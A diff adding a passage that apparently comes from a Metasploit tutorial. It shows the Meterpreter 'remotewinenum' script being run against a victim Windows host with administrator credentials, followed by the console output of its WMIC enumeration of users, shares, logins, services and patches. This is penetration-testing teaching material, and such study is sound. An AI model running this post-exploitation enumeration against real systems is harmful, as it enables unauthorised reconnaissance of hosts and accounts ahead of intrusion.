@@ -1,0 +1,44 @@
+The remotewinenum script will enumerate system information through wmic on victim. Make note of where the logs are stored.
+
+meterpreter > run remotewinenum
+
+[!] Meterpreter scripts are deprecated. Try post/windows/gather/wmic_command.
+[!] Example: run post/windows/gather/wmic_command OPTION=value [...]
+Remote Windows Enumeration Meterpreter Script
+This script will enumerate windows hosts in the target enviroment
+given a username and password or using the credential under witch
+Meterpeter is running using WMI wmic windows native tool.
+Usage:
+
+OPTIONS:
+
+    -h        Help menu.
+    -p   Password of user on target system
+    -t   The target address
+    -u   User on the target system (If not provided it will use credential of process)
+
+ meterpreter > run remotewinenum -u administrator -p ihazpassword -t 10.211.55.128
+
+[*] Saving report to /root/.msf4/logs/remotewinenum/10.211.55.128_20090711.0142
+[*] Running WMIC Commands ....
+[*]     running command wimic environment list
+[*]     running command wimic share list
+[*]     running command wimic nicconfig list
+[*]     running command wimic computersystem list
+[*]     running command wimic useraccount list
+[*]     running command wimic group list
+[*]     running command wimic sysaccount list
+[*]     running command wimic volume list brief
+[*]     running command wimic logicaldisk get description,filesystem,name,size
+[*]     running command wimic netlogin get name,lastlogon,badpasswordcount
+[*]     running command wimic netclient list brief
+[*]     running command wimic netuse get name,username,connectiontype,localname
+[*]     running command wimic share get name,path
+[*]     running command wimic nteventlog get path,filename,writeable
+[*]     running command wimic service list brief
+[*]     running command wimic process list brief
+[*]     running command wimic startup list full
+[*]     running command wimic rdtoggle list
+[*]     running command wimic product get name,version
+[*]     running command wimic qfe list
+
